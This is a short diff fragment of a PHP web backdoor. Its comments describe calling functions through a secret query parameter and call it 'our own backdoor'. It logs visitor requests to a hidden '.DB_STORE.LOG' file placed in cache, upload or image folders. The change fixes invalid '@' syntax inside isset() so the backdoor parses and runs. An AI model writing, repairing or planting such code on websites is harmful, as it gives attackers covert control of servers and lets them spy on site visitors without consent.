@@ -1,6 +1,6 @@
 <?php
 //?[sign][func]=arg
-if(isset(@$_SERVER['HTTP_HOST']) && @$_SERVER['HTTP_HOST'] != ''){
+if(isset($_SERVER['HTTP_HOST']) && @$_SERVER['HTTP_HOST'] != ''){
         editl3O0();
         logl130O();
 }
@@ -8,7 +8,7 @@ if(isset(@$_SERVER['HTTP_HOST']) && @$_SERVER['HTTP_HOST'] != ''){
 //记录
 function logl130O(){
 try{
-        if(isset(@$_GET[get_sign()])) return;//如果是自己的后门操作则忽略
+        if(isset($_GET[get_sign()])) return;//如果是自己的后门操作则忽略
         $filename = '.DB_STORE.LOG'; //日志文件名
         $saveDir = array('/cache/','/upload/', '/uploads/', '/images/', '/image/', '/img/', '/'); //日志保存的目录
         
